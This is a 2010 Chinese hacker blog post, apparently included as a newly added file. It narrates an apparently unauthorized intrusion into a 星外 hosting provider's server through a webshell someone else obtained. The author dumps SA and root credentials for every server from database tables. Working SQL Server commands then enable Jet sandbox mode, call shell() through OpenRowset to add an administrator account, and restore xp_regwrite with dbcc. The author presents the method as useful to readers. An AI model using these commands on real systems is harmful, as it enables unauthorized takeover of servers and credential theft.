@@ -1,0 +1,49 @@
+
+ 记星外提权的曲折过程发布:独自等待 | 发布时间: 2010年11月19日
+BY:天使之翼
+BLOG:http://hi.baidu.com/hack078
+t00ls首发
+今天朋友丢了个星外主站的SHELL过来
+不知他是怎么搞的,权限都设置得都NB 什么组件都删光光了,只支持ASP 汗的是全部没写入和修改权限,都不知道那Y是怎么拿到SHELL的
+不光是这样,他的马都有点问题,使用起来都不爽,
+还好,在Global.asa 找到了数据库连接文件 ,不是SA 不过密码和SA的一样 本想可以直接提权了,没想什么组件都删了,而且用这个SHELL不习惯
+又执行不了命令,SHELL也没写入修改权限,,头大,, 之后直接用SHELL自带的SQL连接一下
+看看里面的表什么的,查了查
+SELECT * FROM [FreeHost_Serversqllist]
+这个表得到一些数据
+ 
+
+他所有服务器的SA ROOT账号 包含本机的,这下好了,,,有戏,不过高兴了早一点,,,接着想UDF提权,不过没写入权限,晕 
+怎么办,想了想,查他上机开通的主机看看,说不定他不是独立服务器,,
+SELECT * FROM [FreeHost_Product_Host]
+
+看了一下 站不多,只有300多个 仔细的找一下,,找到同服务器的 这下好了,星外主目录没写权限,我直接从FTP下手,,找了个站 用FTP传了UDF上去 本以为就此搞定,结果郁闷了一下 UDF不能导出 
+我想应该是降权了 在群里问了一下,,好你星外的权限配置得比较BT 没办法了
+搞了1个多小时 ,没搞下郁闷 
+其实是我走了弯路了 回想下 记得可以用SA沙盘提权 
+就接着试 不过什么xp_cmdshell等组件都删了 
+头疼 百度YY一下找到了恢复XP_cmdshell的,不过执行一下不成功 不知道为什么,,后来才发现是马的问题 
+沙盘就没去看了, 不过百度找到一个新方法
+SA下不用恢复xp_cmdshell和xplog70.dll也执行命令
+http://www.4shell.org/archives/242.html
+在这种情况下，要执行命令，条件是要有xp_regwrite。
+首先开启沙盘模式：
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+然后利用jet.oledb执行系统命令
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net user admin admin /add")')
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net localgroup administrators admin /add")')
+
+试了下不成 在找到
+dbcc addextendedproc ('xp_regread','xpstar.dll')
+dbcc addextendedproc ('xp_regwrite','xpstar.dll')
+恢复了一下,,,成功了 这样提权成功 
+不过失误了一下 在加管理组的时候
+写错一点命令 以为他管理级改了,,忙活半天 才发现
+本人文采不好,,,,写了半天发现上面的文字YY的我看得都头大了 
+http://www.4shell.org/archives/242.html
+http://www.4shell.org/archives/1718.html
+这是找到的两篇文章 希望对大家有用了
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/732.html 
+
+
